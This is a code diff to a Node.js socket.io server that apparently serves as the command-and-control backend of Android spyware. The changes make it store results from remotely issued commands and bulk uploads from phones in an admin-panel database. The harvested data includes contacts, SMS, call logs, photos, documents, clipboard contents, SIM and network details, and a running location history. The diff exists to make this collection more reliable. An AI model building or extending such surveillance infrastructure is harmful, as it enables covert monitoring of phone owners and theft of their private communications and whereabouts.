@@ -207,21 +207,59 @@ io.on('connection', async (socket) => {
           
           // Sanitize result - convert to plain object
           const cleanResult = result ? JSON.parse(JSON.stringify(result)) : null;
-          
-          await Device.findOneAndUpdate(
-            { deviceId: socket.deviceId },
-            { 
-              $push: {
-                commands: {
-                  commandId,
-                  status: status || 'executed',
-                  result: cleanResult,
-                  executedAt: new Date()
-                }
+
+          // Helper: extract array from a possibly-wrapped object
+          const extractFromResult = (val, preferredKey) => {
+            if (!val) return val;
+            if (Array.isArray(val)) return val;
+            if (typeof val === 'object') {
+              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
+              for (const k of Object.keys(val)) {
+                if (Array.isArray(val[k])) return val[k];
               }
             }
+            return val;
+          };
+
+          // Also persist result data into device.data so admin panel can display it
+          const dataSetOps = {};
+          if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
+            if (cleanResult.contacts)              dataSetOps['data.contacts']      = extractFromResult(cleanResult.contacts, 'contacts');
+            if (cleanResult.sms)                   dataSetOps['data.sms']           = extractFromResult(cleanResult.sms, 'sms');
+            if (cleanResult.callLogs)              dataSetOps['data.callLogs']      = extractFromResult(cleanResult.callLogs, 'callLogs');
+            if (cleanResult.installedApps)         dataSetOps['data.installedApps'] = extractFromResult(cleanResult.installedApps, 'installedApps');
+            if (cleanResult.deviceInfo)            dataSetOps['data.deviceInfo']    = cleanResult.deviceInfo;
+            if (cleanResult.photos || cleanResult.images) dataSetOps['data.photos'] = extractFromResult(cleanResult.photos || cleanResult.images, 'images');
+            if (cleanResult.videos)                dataSetOps['data.videos']        = extractFromResult(cleanResult.videos, 'videos');
+            if (cleanResult.documents)             dataSetOps['data.documents']     = extractFromResult(cleanResult.documents, 'documents');
+            if (cleanResult.battery)               dataSetOps['data.battery']       = cleanResult.battery;
+            if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
+            if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
+            if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
+          }
+
+          const updateDoc = {
+            $push: {
+              commands: {
+                commandId,
+                status: status || 'executed',
+                result: cleanResult,
+                executedAt: new Date()
+              }
+            }
+          };
+          if (Object.keys(dataSetOps).length > 0) {
+            updateDoc.$set = dataSetOps;
+          }
+
+          await mongoose.connection.db.collection('devices').updateOne(
+            { deviceId: socket.deviceId },
+            updateDoc
           );
+
           io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result: cleanResult, status });
+          // Notify admin panels that device data was updated so UI can refresh
+          io.emit('device:data:update', { deviceId: socket.deviceId });
         } catch (err) {
           console.error('Result error:', err.message);
         }
@@ -229,52 +267,69 @@ io.on('connection', async (socket) => {
 
       socket.on('device:data:bulk', async (data) => {
         try {
-          // Helper to extract array from wrapped objects
-          const extractArray = (val) => {
+          // Helper to extract the actual array from a possibly-wrapped object.
+          // Android wraps arrays like: { contacts: [...] } or { sms: [...], total: N }
+          // We look for the preferred key first, then fall back to any array value.
+          const extractArray = (val, preferredKey) => {
+            if (!val) return val;
             if (Array.isArray(val)) return val;
-            if (typeof val === 'object' && val !== null) {
-              const keys = Object.keys(val);
-              if (keys.length === 1 && Array.isArray(val[keys[0]])) {
-                return val[keys[0]];
+            if (typeof val === 'object') {
+              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
+              for (const k of Object.keys(val)) {
+                if (Array.isArray(val[k])) return val[k];
               }
             }
             return val;
           };
-          
-          // Build update document for each data type
-          const updateOps = {};
-          const dataKeys = ['contacts', 'sms', 'callLogs', 'photos', 'videos', 'documents', 'installedApps'];
-          dataKeys.forEach(key => {
-            if (data[key]) {
-              updateOps[`data.${key}`] = extractArray(data[key]);
+
+          // Build $set fields for each known data type
+          // Android key → preferred inner key (for unwrapping)
+          const dataKeyMap = {
+            contacts:     'contacts',
+            sms:          'sms',
+            callLogs:     'callLogs',
+            photos:       'images',   // getMediaFiles("images") wraps as { images: [...] }
+            videos:       'videos',
+            documents:    'documents',
+            installedApps:'installedApps'
+          };
+
+          const setOps = {};
+          Object.entries(dataKeyMap).forEach(([key, innerKey]) => {
+            if (data[key] != null) {
+              setOps[`data.${key}`] = extractArray(data[key], innerKey);
             }
           });
-          
-          // Handle special fields
-          if (data.deviceInfo) updateOps['data.deviceInfo'] = data.deviceInfo;
-          if (data.battery) updateOps['data.battery'] = data.battery;
-          if (data.simInfo) updateOps['data.simInfo'] = data.simInfo;
-          if (data.networkInfo) updateOps['data.networkInfo'] = data.networkInfo;
-          if (data.clipboard) updateOps['data.clipboard'] = data.clipboard;
-          
-          // Handle location
-          if (data.location) {
-            updateOps['$push'] = { 'data.locations': {
-              ...data.location,
-              timestamp: new Date()
-            }};
+
+          // Handle scalar / object special fields
+          if (data.deviceInfo)   setOps['data.deviceInfo']   = data.deviceInfo;
+          if (data.battery)      setOps['data.battery']      = data.battery;
+          if (data.simInfo)      setOps['data.simInfo']      = data.simInfo;
+          if (data.networkInfo)  setOps['data.networkInfo']  = data.networkInfo;
+          if (data.clipboard)    setOps['data.clipboard']    = data.clipboard;
+
+          // Build the full MongoDB update document
+          const updateDoc = {};
+          if (Object.keys(setOps).length > 0) {
+            updateDoc.$set = setOps;
           }
-          
-          if (Object.keys(updateOps).length > 0) {
-            // Use updateOne with raw ops to avoid schema casting issues
+
+          // Location must use $push (separate operator — NOT inside $set)
+          if (data.location && (data.location.lat != null || data.location.lng != null)) {
+            updateDoc.$push = {
+              'data.locations': { ...data.location, timestamp: new Date() }
+            };
+          }
+
+          if (Object.keys(updateDoc).length > 0) {
             await mongoose.connection.db.collection('devices').updateOne(
               { deviceId: socket.deviceId },
-              { $set: updateOps }
+              updateDoc
             );
-            console.log(`Data saved for ${socket.deviceId}:`, Object.keys(updateOps).join(', '));
+            console.log(`Bulk data saved for ${socket.deviceId}:`, Object.keys(setOps).join(', '));
           }
-          
-          io.emit('device:data:update', { deviceId: socket.deviceId, data });
+
+          io.emit('device:data:update', { deviceId: socket.deviceId });
         } catch (err) {
           console.error('Bulk data error:', err.message);
         }
@@ -404,6 +459,11 @@ app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
     const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
+    // Mongoose Map type can come back as a JS Map object even after .lean()
+    // Convert to a plain object so the frontend can access device.data.contacts etc.
+    if (device.data instanceof Map) {
+      device.data = Object.fromEntries(device.data);
+    }
     res.json(device);
   } catch (err) {
     res.status(500).json({ error: err.message });
